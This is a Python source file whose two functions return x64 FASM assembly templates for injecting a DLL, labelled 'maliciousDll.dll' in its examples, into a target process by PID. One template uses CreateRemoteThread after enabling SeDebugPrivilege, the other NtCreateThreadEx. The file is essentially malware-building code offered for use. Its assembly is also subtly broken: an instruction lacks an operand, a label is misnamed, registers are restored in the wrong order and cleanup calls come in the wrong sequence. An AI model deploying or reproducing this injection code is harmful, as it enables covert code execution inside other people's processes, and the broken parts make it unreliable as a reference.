#/usr/bin/env python

def dllInjection_CreateRemoteThread():
    code = r"""
; allow to inject a dll into a process
; modify the PID value into equates.inc file
; modify sDllName value into the rdatas.inc file
; be carreful: DllPath+DllName = 256d max
; how to use: 
;       add into the bss.inc file:
;            hProcess            dq ?
;            hKernel32           dq ?
;            hLoadLibraryAddr    dq ?
;            lDllPath            db 256d dup(0) ; len  of the buffer containing the DLL name
;            hBaseAddr           dq ?
;            hRemoteThread       dq ?
;            hToken              dq ?
;            tokens              dq ?
;            nSizeDLL            dq ?
;            tkp                 TOKEN_PRIVILEGES
;            struc LUID{
;                .Luid       LUID
;                .Attributes dd ?
;            }
;            struc TOKEN_PRIVILEGES{
;                .PrivilegeCount dd ?
;                .Privileges     LUI_AND_ATTRIBUTES
;            }
;
;            TOKEN_QUERY_TOEKN_ADJUST_PRIVILEGES = 28h
;
;       add into the equates.inc file:
;            PID         dd 1240d        ; pid to inject
;            lDllName    dd 256d         ; len max of the DllPath + DllName
;       add into the idatas.inc file:
;            library     kernel32, 'kernel32.dll', \
;                        advapi32, 'advapi32.dll'
;
;            import      kernel32, GetProcAddress, 'GetProcAddress', \
;                                OpenProcess, 'OpenProcess', \
;                                GetModuleHandle, 'GetModuleHandleA', \
;                                GetFullPathName, 'GetFullPathNameA', \
;                                VirtualAllocEx, 'VirtualAllocEx', \
;                                WriteProcessMemory, 'WriteProcessMemory', \
;                                WaitForSingleObject, 'WaitForSingleObject', \
;                                CloseHandle, 'CloseHandle', \
;                                VirtualFreeEx, VirtualFreeEx, \
;                                CreateRemoteThread, 'CreateRemoteThread', \
;                                GetCurrentProcess, 'GetCurrentProcess'
;            import      advapi32, AdjustTokenPrivileges, 'AdjustTokenPrivileges', \
;                                OpenProcessToken, 'OpenProcessToken', \
;                                LookupPrivilegeValue, 'LookupPrivilegeValueW'
;                                   
;
;       add into the rdatas.inc file:
;            sDllName        db 'C:\Users\windaube\Desktop\maliciousDll.dll', 0
;            sKernel32       db 'kernel32.dll', 0
;            sLoadLibrary    db 'LoadLibraryA', 0
;       then make a call:
;           call    _START_DLL_INJECTION_CREATE_REMOTE_THREAD
;       return value:
;           rax = 1: successful
;           rax = 0: unsuccessful
_START_DLL_INJECTION_CREATE_REMOTE_THREAD:
    push    rbx
    push    rcx
    push    rdx
    push    rsi
    push    rdi
    push    r8
    push    r9

    invoke  GetCurrentProcess

    invoke  OpenProcessToken, rax, TOKEN_QUERY_ADJUST_PRIVILEGES, addr hToken

    invoke  LookupPrivilegeValue, NULL, "SeDebugPrivilege", tkp.Privileges.Luid
    mov     [tkp.PrivilegeCount], 1
    mov     [tkp.Privileges.Attributes], 2 ; SE_PRIVILEGE_ENABLED

    invoke  AdjustTokenPrivileges, [hToken], 0, addr tokens, 0, 0, 0

    invoke  CloseHandle, [hToken]
    
    invoke  OpenProcess, PROCESS_ALL_ACCESS, FALSE, [PID]
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov     [hProcess], rax

    invoke  VirtualAllocEx, [hProcess], NULL, 256d, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov     [hBaseAddr], rax

    invoke  WriteProcessMemory, [hProcess], [hBaseAddr], lDllPath, 256d, NULL
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX

    invoke  GetModuleHandle, sKernel32
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov     [hKernel32], rax

    invoke  GetProcAddress, [hKernel32], sLoadLibrary
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov     [hLoadLibraryAddr]

    invoke  CreateRemoteThread, [hProcess], NULL, 0, [hLoadLibraryAddr], [hBaseAddr], 0, NULL
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX

    mov     rax, 1
    jmp     _END_DLL_INJECTION_CREATE_REMOTE_THREAD

_ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX:
    xor     rax, rax

_END_DLL_INJECTION_CREATE_REMOTE_THREAD:
    pop     rbx
    pop     rcx
    pop     rdx
    pop     rsi
    pop     rdi
    pop     r8
    pop     r9

    ret
"""
    return code

def dllInjection_NtCreateThreadEx():
    code = r"""
; allow to inject a dll into a process
; modify the PID value into equates.inc file
; modify sDllName value into the rdatas.inc file
; be carreful: DllPath+DllName = 256d max
; how to use: 
;       add into the bss.inc file:
;            hProcess            dq ?
;            hNtdll              dq ?
;            hKernel32           dq ?
;            hNtCreateThreadAddr dq ?
;            hLoadLibraryAddr    dq ?
;            lDllPath            db 256d dup(0) ; len  of the buffer containing the DLL name
;            hBaseAddr           dq ?
;            hRemoteThread       dq ?
;       add into the equates.inc file:
;            PID         dd 1240d        ; pid to inject
;            lDllName    dd 256d         ; len max of the DllPath + DllName
;       add into the idatas.inc file:
;            library     kernel32, 'kernel32.dll'
;
;            import      kernel32, GetProcAddress, 'GetProcAddress', \
;                                OpenProcess, 'OpenProcess', \
;                                GetModuleHandle, 'GetModuleHandleA', \
;                                GetFullPathName, 'GetFullPathNameA', \
;                                VirtualAllocEx, 'VirtualAllocEx', \
;                                WriteProcessMemory, 'WriteProcessMemory', \
;                                WaitForSingleObject, 'WaitForSingleObject', \
;                                CloseHandle, 'CloseHandle', \
;                                VirtualFreeEx, VirtualFreeEx
;       add into the rdatas.inc file:
;            sDllName        db 'C:\Users\windaube\Desktop\maliciousDll.dll', 0
;            sNtdll          db 'ntdll.dll', 0
;            sKernel32       db 'kernel32.dll', 0
;            sNtCreateThread db 'NtCreateThreadEx', 0
;            sLoadLibrary    db 'LoadLibraryA', 0
;       then make a call:
;           call    _START_DLL_INJECTION_NT_CREATE_THREAD_EX
;       return value:
;           rax = 1: successful
;           rax = 0: unsuccessful
_START_DLL_INJECTION_NT_CREATE_THREAD_EX:
    push    rbx
    push    rcx
    push    rdx
    push    rsi
    push    rdi
    push    r8
    push    r9

    invoke  OpenProcess, PROCESS_ALL_ACCESS, FALSE, [PID]
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov      [hProcess], rax

    invoke  GetModuleHandle, sNtdll
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov     [hNtdll], rax

    invoke  GetModuleHandle, sKernel32
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov     [hKernel32], rax

    invoke  GetProcAddress, [hNtdll], sNtCreateThread
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov     [hNtCreateThreadAddr], rax

    invoke  GetProcAddress, [hKernel32], sLoadLibrary
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov     [hLoadLibrary], rax

    invoke  GetFullPathName, sDllName, lDllName, lDllPath, NULL

    invoke  VirtualAllocEx, [hProcess], NULL, 256d, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX
    mov     [hBaseAddr], rax

    invoke  WriteProcessMemory, [hProcess], [hBaseAddr], lDllPath, 256d, NULL
    cmp     rax, 0
    jz      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX

    mov     rax, [hNtCreateThreadAddr]

    mov     rcx, hRemoteThread
    mov     rdx, GENERIC_ALL
    mov     r8, NULL
    mov     r9, [hProcess]

    mov     rsi, [hLoadLibraryAddr]
    mov     [rsp+20h], rsi
    mov     rsi, [hBaseAddr]
    mov     [rsp+28h], rsi
    xor     rsi, rsi
    mov     [rsp+30h], rsi ; FALSE
    mov     [rsp+38h], rsi ; NULL
    mov     [rsp+40h], rsi ; NULL
    mov     [rsp+48h], rsi ; NULL
    mov     [rsp+50h], rsi ; NULL

    call    rax ; cannot use invoke with rax

    cmp     rax, 0
    jl      _ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX ; if rax=0: NtCreateThreadEx is successful


    invoke  WaitForSingleObject, [hRemoteThread], -1 ; -1 -> INFINITE (but this str is not well handled with FASM)

    invoke  CloseHandle, [hProcess]

    invoke  VirtualFreeEx, [hProcess], [hBaseAddr], 256d, MEM_RELEASE

    mov     rax, 1
    jmp     _END_DLL_INJECTION_NT_CREATE_THREAD_EX

_ERROR_DLL_INJECTION_NT_CREATE_THREAD_EX:
    xor     rax, rax

_END_DLL_INJECTION_NT_CREATE_THREAD_EX:
    pop    rbx
    pop    rcx
    pop    rdx
    pop    rsi
    pop    rdi
    pop    r8
    pop    r9

    ret     ; return to the caller
"""

    return code

